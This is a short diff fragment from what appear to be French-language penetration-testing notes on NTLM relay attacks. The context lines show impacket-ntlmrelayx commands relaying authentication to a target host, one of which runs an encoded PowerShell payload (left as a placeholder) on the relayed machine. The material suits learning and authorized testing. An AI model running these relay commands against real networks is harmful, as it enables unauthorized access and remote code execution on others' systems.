@@ -22,4 +22,3 @@ impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET_IP
 ## On peut également exécuter une commande :
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <B64_PAYLOAD>'
 ```
-
